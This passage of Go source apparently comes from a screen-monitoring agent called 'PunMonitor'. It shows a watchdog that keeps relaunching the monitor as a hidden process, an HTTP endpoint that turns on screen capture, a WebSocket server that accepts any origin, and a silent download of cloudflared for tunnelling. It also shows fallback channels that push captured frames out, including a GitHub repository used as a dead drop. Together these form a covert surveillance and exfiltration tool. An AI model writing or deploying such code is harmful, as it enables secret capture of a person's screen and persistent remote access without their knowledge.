			cfg.IsServerMode = true
			llog("info", "Promoted to server mode via HTTP")
			if serverCancel != nil { serverCancel() }
			serverCtx, serverCancel = context.WithCancel(context.Background())
			go startScreenCapture(serverCtx)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{"status": "ok", "mode": "server"})
		})

		http.HandleFunc("/api/transport-status", func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(getTransportStatus())
		})

		http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
			upgrader := websocket.Upgrader{
				CheckOrigin: func(r *http.Request) bool { return true },
			}
			conn, err := upgrader.Upgrade(w, r, nil)
			if err != nil {
				llog("error", "WebSocket upgrade failed: %v", err)
				return
			}
			llog("info", "WebSocket client connected")

			wsClients.Store(conn, true)
			defer func() {
				wsClients.Delete(conn)
				conn.Close()
				llog("info", "WebSocket client disconnected")
			}()

			for {
				_, msg, err := conn.ReadMessage()
				if err != nil {
					if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
						llog("error", "WebSocket read error: %v", err)
					}
					break
				}
				handleWSMessage(conn, msg)
			}
		})

		addr := fmt.Sprintf(":%d", cfg.ConfigPort)
		llog("info", "Starting HTTP server on %s", addr)
		if err := http.ListenAndServe(addr, nil); err != nil {
			llog("error", "HTTP server failed: %v", err)
		}
	}()

	select {}
}

// --- Watchdog ---

var wdLogFile *os.File

func wdLogOpen() {
	if wdLogFile != nil {
		return
	}
	f, err := os.OpenFile(filepath.Join(exeDir(), "watchdog.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	wdLogFile = f
}

func wlog(format string, args ...interface{}) {
	wdLogOpen()
	if wdLogFile != nil {
		wdLogFile.WriteString(time.Now().Format("15:04:05.000") + " " + fmt.Sprintf(format, args...) + "\n")
	}
}

func runWatchdog() {
	if !watchdogSingleton() {
		wlog("Watchdog already running, exiting")
		os.Exit(1)
	}
	wlog("Watchdog started")

	exePath, err := os.Executable()
	if err != nil {
		wlog("Failed to get executable path: %v", err)
		os.Exit(1)
	}

	for {
		cmd := exec.Command(exePath)
		cmd.Stdout = nil
		cmd.Stderr = nil
		newHiddenCmd(cmd)

		wlog("Starting monitor...")
		if err := cmd.Start(); err != nil {
			wlog("Failed to start monitor: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}
		wlog("Monitor PID: %d", cmd.Process.Pid)

		if err := cmd.Wait(); err != nil {
			wlog("Monitor exited with error: %v", err)
		} else {
			wlog("Monitor exited cleanly")
		}
		time.Sleep(3 * time.Second)
	}
}

// --- Utility ---

func formatTime(ms int64) string {
	if ms == 0 {
		return "never"
	}
	return time.UnixMilli(ms).Format("2006-01-02 15:04:05")
}

// --- ActivityStore ---

type SessionState struct {
	BootTimeMS       int64  `json:"boot_time_ms"`
	LastStartupMS    int64  `json:"last_startup_ms"`
	LastShutdownMS   int64  `json:"last_shutdown_ms"`
	LastIdleStartMS  int64  `json:"last_idle_start_ms"`
	LastActiveMS     int64  `json:"last_active_ms"`
	LastWakeMS       int64  `json:"last_wake_ms"`
	LastShutdownNote string `json:"last_shutdown_note,omitempty"`
}

type ActivityStore struct {
	mu    sync.Mutex
	state SessionState
	path  string
	log   string
}

var globalActivity *ActivityStore

func initActivityStore() *ActivityStore {
	if globalActivity != nil {
		return globalActivity
	}
	dir := dataDir()
	s := &ActivityStore{
		path: filepath.Join(dir, "session_state.json"),
		log:  filepath.Join(dir, "activity_log.jsonl"),
	}
	s.load()
	now := time.Now().UnixMilli()
	boot := systemBootTimeMS()
	s.mu.Lock()
	if boot > 0 && boot != s.state.BootTimeMS {
		s.state.BootTimeMS = boot
		s.recordLocked("system_startup", formatTime(boot)+" — system boot")
		s.state.LastWakeMS = now
	}
	s.state.LastStartupMS = now
	s.recordLocked("agent_start", "PunMonitor started")
	s.mu.Unlock()
	s.save()
	globalActivity = s
	return s
}

func (s *ActivityStore) load() {
	data, err := os.ReadFile(s.path)
	if err != nil {
		return
	}
	_ = json.Unmarshal(data, &s.state)
}

func (s *ActivityStore) save() {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, _ := json.MarshalIndent(s.state, "", "  ")
	_ = os.WriteFile(s.path, data, 0644)
}

func (s *ActivityStore) Record(typ, detail string) {
	s.mu.Lock()
	s.recordLocked(typ, detail)
	s.mu.Unlock()
	s.save()
}

func (s *ActivityStore) recordLocked(typ, detail string) {
	now := time.Now().UnixMilli()
	switch typ {
	case "user_idle_start":
		s.state.LastIdleStartMS = now
	case "user_active":
		s.state.LastActiveMS = now
	case "user_idle_end":
	case "agent_start":
	case "agent_stop":
		s.state.LastShutdownMS = now
	default:
	}
	if detail != "" {
		s.state.LastShutdownNote = detail
	}
}

func (s *ActivityStore) Summary() map[string]string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return map[string]string{
		"boot_time":       formatTime(s.state.BootTimeMS),
		"last_startup":    formatTime(s.state.LastStartupMS),
		"last_shutdown":   formatTime(s.state.LastShutdownMS),
		"last_active":     formatTime(s.state.LastActiveMS),
		"last_idle_start": formatTime(s.state.LastIdleStartMS),
		"last_wake":       formatTime(s.state.LastWakeMS),
	}
}

func (s *ActivityStore) RecentEvents(max int) []ActivityEvent {
	return []ActivityEvent{}
}

func appendActivityLog(path string, ev ActivityEvent) {}

// --- EnsureCloudflaredInstalled ---

func EnsureCloudflaredInstalled() error {
	_, err := exec.LookPath("cloudflared")
	if err == nil {
		return nil
	}

	llog("info", "cloudflared not found, downloading...")

	var arch, ext, downloadURL string
	switch runtime.GOARCH {
	case "386":
		arch = "386"
	case "arm64":
		arch = "arm64"
	default:
		arch = "amd64"
	}

	switch runtime.GOOS {
	case "windows":
		ext = ".exe"
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-%s%s", arch, ext)
	case "darwin":
		ext = ""
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-%s", arch)
	default:
		ext = ""
		downloadURL = fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s", arch)
	}

	binName := "cloudflared" + ext
	binDir := filepath.Join(dataDir(), "bin")
	os.MkdirAll(binDir, 0755)
	dest := filepath.Join(binDir, binName)

	resp, err := http.Get(downloadURL)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("download status: %d", resp.StatusCode)
	}

	out, err := os.Create(dest)
	if err != nil {
		return fmt.Errorf("create file: %w", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("copy failed: %w", err)
	}

	if runtime.GOOS != "windows" {
		os.Chmod(dest, 0755)
	}

	os.Setenv("PATH", os.Getenv("PATH")+string(os.PathListSeparator)+binDir)

	llog("info", "cloudflared installed to %s", dest)
	return nil
}

// --- Transport infrastructure ---

var (
	healthChecker   = NewHealthChecker()
	transportPool   = NewTransportPool(healthChecker)
	reconnectMgr    = NewReconnectManager()
	ghTransport     *githubTransport
	activeTransport string
)

type HealthChecker struct {
	mu     sync.Mutex
	dead   map[string]bool
	onDead func(string)
}

func NewHealthChecker() *HealthChecker {
	return &HealthChecker{dead: make(map[string]bool)}
}

func (hc *HealthChecker) SetOnDead(cb func(string)) {
	hc.onDead = cb
}

func (hc *HealthChecker) Register(id string) {
	hc.mu.Lock()
	hc.dead[id] = false
	hc.mu.Unlock()
}

func (hc *HealthChecker) Heartbeat(id string) {
	hc.mu.Lock()
	hc.dead[id] = false
	hc.mu.Unlock()
}

func (hc *HealthChecker) IsDead(id string) bool {
	hc.mu.Lock()
	defer hc.mu.Unlock()
	return hc.dead[id]
}

func (hc *HealthChecker) ReportFailure(id string, err error) {
	if err == nil {
		return
	}
	hc.mu.Lock()
	hc.dead[id] = true
	cb := hc.onDead
	hc.mu.Unlock()
	if cb != nil {
		cb(id)
	}
}

type poolEntry struct {
	transport Transport
	priority  int
}

type TransportPool struct {
	mu      sync.RWMutex
	entries map[string]poolEntry
}

func NewTransportPool(hc *HealthChecker) *TransportPool {
	tp := &TransportPool{entries: make(map[string]poolEntry)}
	hc.SetOnDead(func(id string) {
		tp.Remove(id)
	})
	return tp
}

func (tp *TransportPool) Add(id string, t Transport) {
	if tp == nil || t == nil {
		return
	}
	pri := math.MaxInt32
	switch tr := t.(type) {
	case *wsTransport:
		pri = tr.Priority()
	case *quicTransport:
		pri = tr.Priority()
	case *webrtcTransport:
		pri = tr.Priority()
	case *githubTransport:
		pri = tr.Priority()
	}
	tp.mu.Lock()
	tp.entries[id] = poolEntry{transport: t, priority: pri}
	tp.mu.Unlock()
	llog("info", "Transport added: %s (priority %d)", id, pri)
}

func (tp *TransportPool) Remove(id string) {
	tp.mu.Lock()
	delete(tp.entries, id)
	tp.mu.Unlock()
	llog("info", "Transport removed: %s", id)
}

func (tp *TransportPool) GetBest() Transport {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	var best Transport
	bestPri := math.MaxInt32
	for _, e := range tp.entries {
		if e.priority < bestPri && !healthChecker.IsDead(e.transport.Name()) {
			bestPri = e.priority
			best = e.transport
		}
	}
	return best
}

func (tp *TransportPool) GetByName(name string) Transport {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	for _, e := range tp.entries {
		if e.transport.Name() == name {
			return e.transport
		}
	}
	return nil
}

type ReconnectManager struct {
	mu      sync.Mutex
	backoff map[string]time.Duration
}

func NewReconnectManager() *ReconnectManager {
	return &ReconnectManager{backoff: make(map[string]time.Duration)}
}

func (rm *ReconnectManager) Wait(url string) {
	rm.mu.Lock()
	d := rm.backoff[url]
	rm.mu.Unlock()
	if d > 0 {
		time.Sleep(d)
	}
}

func (rm *ReconnectManager) Success(url string) {
	rm.mu.Lock()
	rm.backoff[url] = 0
	rm.mu.Unlock()
}

func (rm *ReconnectManager) Failure(url string) {
	rm.mu.Lock()
	d := rm.backoff[url]
	if d == 0 {
		d = 1 * time.Second
	} else {
		d *= 2
		if d > 1*time.Minute {
			d = 1 * time.Minute
		}
	}
	rm.backoff[url] = d
	rm.mu.Unlock()
}

func sendViaBestTransport(wm *WireMessage) {
	t := transportPool.GetBest()
	if t != nil {
		if err := t.Send(wm); err != nil {
			healthChecker.ReportFailure(t.Name(), err)
			t2 := transportPool.GetBest()
			if t2 != nil && t2.Name() != t.Name() {
				t2.Send(wm)
				activeTransport = t2.Name()
			}
		} else {
			healthChecker.Heartbeat(t.Name())
			activeTransport = t.Name()
		}
	}
}

type wsTransport struct {
	conn     *websocket.Conn
	priority int
	url      string
}

func NewWSTransport(conn *websocket.Conn, priority int, url string) Transport {
	return &wsTransport{
		conn:     conn,
		priority: priority,
		url:      url,
	}
}

func (t *wsTransport) Send(wm *WireMessage) error {
	if t.conn == nil {
		return fmt.Errorf("websocket connection is nil")
	}
	return t.conn.WriteMessage(websocket.TextMessage, wm.Marshal())
}

func (t *wsTransport) Recv() (*WireMessage, error) {
	if t.conn == nil {
		return nil, fmt.Errorf("websocket connection is nil")
	}
	_, data, err := t.conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data, &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func (t *wsTransport) Name() string               { return "ws" }
func (t *wsTransport) Priority() int               { return t.priority }

type quicTransport struct {
	conn     *quic.Conn
	stream   quic.Stream
	priority int
}

func NewQuicTransport(conn *quic.Conn, stream quic.Stream, priority int) Transport {
	return &quicTransport{
		conn:     conn,
		stream:   stream,
		priority: priority,
	}
}

func (t *quicTransport) Send(wm *WireMessage) error {
	_, err := t.stream.Write(wm.Marshal())
	return err
}

func (t *quicTransport) Recv() (*WireMessage, error) {
	data := make([]byte, 65536)
	n, err := t.stream.Read(data)
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data[:n], &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func (t *quicTransport) Name() string  { return "quic" }
func (t *quicTransport) Priority() int { return t.priority }

type webrtcTransport struct {
	priority int
}

func NewWebRTCTransport(priority int) Transport {
	return &webrtcTransport{
		priority: priority,
	}
}

func (t *webrtcTransport) Send(wm *WireMessage) error {
	return fmt.Errorf("webrtc transport not yet implemented")
}

func (t *webrtcTransport) Recv() (*WireMessage, error) {
	return nil, fmt.Errorf("webrtc transport not yet implemented")
}

func (t *webrtcTransport) Name() string    { return "webrtc" }
func (t *webrtcTransport) Priority() int   { return t.priority }

type githubTransport struct {
	priority int
	repo     string
	token    string
	mu       sync.Mutex
	lastData []byte
}

func NewGitHubTransport(repo, token string, priority int) Transport {
	return &githubTransport{
		priority: priority,
		repo:     repo,
		token:    token,
	}
}

func (g *githubTransport) Name() string               { return "github" }
func (g *githubTransport) Priority() int               { return g.priority }

func (g *githubTransport) Send(wm *WireMessage) error {
	if g.repo == "" {
		return fmt.Errorf("github repo not configured")
	}
	g.mu.Lock()
	g.lastData = wm.Marshal()
	g.mu.Unlock()

	go func() {
		frameJSON := wm.Marshal()
		encoded := base64.StdEncoding.EncodeToString(frameJSON)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "frame update",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/frames/latest.json", g.repo)
		req, _ := http.NewRequest("PUT", url, bytes.NewReader(payload))
		req.Header.Set("Authorization", "Bearer "+g.token)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			resp.Body.Close()
		}
	}()
	return nil
}

func (g *githubTransport) Recv() (*WireMessage, error) {
	if g.repo == "" {
		return nil, fmt.Errorf("github repo not configured")
	}
	url := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/frames/latest.json", g.repo)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var wm WireMessage
	if err := json.Unmarshal(data, &wm); err != nil {
		return nil, err
	}
	return &wm, nil
}

func bytesToBase64(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

func startTransportMonitor(ctx context.Context) {
	initTransports()
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			current := transportPool.GetBest()
			if current == nil {
				continue
			}
			ping := &WireMessage{Type: "ping"}
			if err := current.Send(ping); err != nil {
				healthChecker.ReportFailure(current.Name(), err)
				llog("warn", "Transport %s failed, falling back", current.Name())
				fallback := transportPool.GetBest()
				if fallback != nil && fallback.Name() != current.Name() {
					llog("info", "Fell back to transport: %s", fallback.Name())
					activeTransport = fallback.Name()
				}
			} else {
				healthChecker.Heartbeat(current.Name())
			}
		case <-ctx.Done():
			return
		}
	}
}

func initTransports() {
	if cfg.GitHubRepo != "" {
		gt := NewGitHubTransport(cfg.GitHubRepo, cfg.GitHubToken, 100)
		ghTransport = gt.(*githubTransport)
		transportPool.Add("github", gt)
		healthChecker.Register("github")
		llog("info", "GitHub fallback transport registered")
	}
}

func getTransportStatus() map[string]interface{} {
	best := transportPool.GetBest()
	bestName := "none"
	if best != nil {
		bestName = best.Name()
	}
	var wsCount int
	wsClients.Range(func(key, value interface{}) bool {
		wsCount++
		return true
	})
	return map[string]interface{}{
		"active":        bestName,
		"healthy":       !healthChecker.IsDead(bestName),
		"ws_clients":    wsCount,
		"tunnel_type":   "named",
		"tunnel_active": tunnelCmd != nil || cfg.CloudflareTunnelID != "",
	}
}

type DNSURLChecker struct {
	domain string
}

func NewDNSURLChecker(domain string, onURLsFound func([]string)) *DNSURLChecker {
	return &DNSURLChecker{domain: domain}
}

func (d *DNSURLChecker) Start()  {}
func (d *DNSURLChecker) Stop()   {}

type GitHubURLChecker struct {
	cfg *Config
}

func NewGitHubURLChecker(cfg *Config, onURLsFound func([]string)) *GitHubURLChecker {
	return &GitHubURLChecker{cfg: cfg}
}

func (g *GitHubURLChecker) Start()  {}
func (g *GitHubURLChecker) Stop()   {}

type ServerList struct {
	URLs []string
	mu   sync.RWMutex
}

func NewServerList() *ServerList {
	return &ServerList{URLs: []string{}}
}

func (sl *ServerList) Get() []string {
	sl.mu.RLock()
	defer sl.mu.RUnlock()
	return append([]string{}, sl.URLs...)
}

func (sl *ServerList) Set(urls []string) {
	sl.mu.Lock()
	sl.URLs = urls
	sl.mu.Unlock()
}

// --- WebRTC ---

type WebRTCClient struct {
	pc          *webrtc.PeerConnection
	dc          *webrtc.DataChannel
	connID      string
	connectedAt time.Time
}

type WebRTCManager struct {
	mu      sync.Mutex
	clients map[string]*WebRTCClient
	api     *webrtc.API
}

var webrtcManager = NewWebRTCManager()
var webrtcDataChannels sync.Map

func NewWebRTCManager() *WebRTCManager {
	s := webrtc.SettingEngine{}
	api := webrtc.NewAPI(webrtc.WithSettingEngine(s))
	return &WebRTCManager{
		clients: make(map[string]*WebRTCClient),
		api:     api,
	}
}

func (m *WebRTCManager) HandleOffer(connID string, sdp string, wsConn *websocket.Conn) {
	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{URLs: []string{"stun:stun.l.google.com:19302"}},
		},
	}

	pc, err := m.api.NewPeerConnection(config)
	if err != nil {
		llog("error", "WebRTC NewPeerConnection: %v", err)
		return
	}

	offer := webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: sdp}
	if err := pc.SetRemoteDescription(offer); err != nil {
		llog("error", "WebRTC SetRemoteDescription: %v", err)
		pc.Close()
		return
	}

	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		llog("error", "WebRTC CreateAnswer: %v", err)
		pc.Close()
		return
	}
	if err := pc.SetLocalDescription(answer); err != nil {
		llog("error", "WebRTC SetLocalDescription: %v", err)
		pc.Close()
		return
	}

	reply, _ := json.Marshal(map[string]interface{}{
		"type": "webrtc_answer",
		"sdp":  answer.SDP,
	})
	wsConn.WriteMessage(websocket.TextMessage, reply)

	var dc *webrtc.DataChannel
	dcReady := make(chan struct{})

	pc.OnDataChannel(func(d *webrtc.DataChannel) {
		dc = d
		d.OnOpen(func() {
			llog("info", "WebRTC data channel open for %s", connID)
			close(dcReady)

			client := &WebRTCClient{
				pc:          pc,
				dc:          d,
				connID:      connID,
				connectedAt: time.Now(),
			}
			m.mu.Lock()
			m.clients[connID] = client
			m.mu.Unlock()
			webrtcDataChannels.Store(connID, d)
		})
		d.OnClose(func() {
			llog("info", "WebRTC data channel closed for %s", connID)
			webrtcDataChannels.Delete(connID)
			m.mu.Lock()
			delete(m.clients, connID)
			m.mu.Unlock()
		})
	})

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil {
			return
		}
		candJSON, _ := json.Marshal(c.ToJSON())
		msg, _ := json.Marshal(map[string]interface{}{
			"type":      "webrtc_ice",
			"candidate": string(candJSON),
		})
		wsConn.WriteMessage(websocket.TextMessage, msg)
	})

	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		if s == webrtc.PeerConnectionStateFailed || s == webrtc.PeerConnectionStateClosed {
			webrtcDataChannels.Delete(connID)
			m.mu.Lock()
			delete(m.clients, connID)
			m.mu.Unlock()
		}
	})

	go func() {
		select {
		case <-dcReady:
			llog("info", "WebRTC ready for %s", connID)
		case <-time.After(30 * time.Second):
			if dc == nil {
				llog("warn", "WebRTC data channel timeout for %s, falling back to WS", connID)
				pc.Close()
			}
		}
	}()
}

func (m *WebRTCManager) HandleICE(connID string, candidateJSON string) {
	m.mu.Lock()
	client, ok := m.clients[connID]
	m.mu.Unlock()
	if !ok {
		return
	}
	var cand webrtc.ICECandidateInit
	if err := json.Unmarshal([]byte(candidateJSON), &cand); err != nil {
		return
	}
	client.pc.AddICECandidate(cand)
}

func (m *WebRTCManager) BroadcastFrame(wm *WireMessage) {
	data := wm.Marshal()
	webrtcDataChannels.Range(func(key, value interface{}) bool {
		if dc, ok := value.(*webrtc.DataChannel); ok {
			if err := dc.Send(data); err != nil {
				webrtcDataChannels.Delete(key)
				m.mu.Lock()
				delete(m.clients, key.(string))
				m.mu.Unlock()
			}
		}
		return true
	})
}

func (m *WebRTCManager) ClientCount() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	return len(m.clients)
}
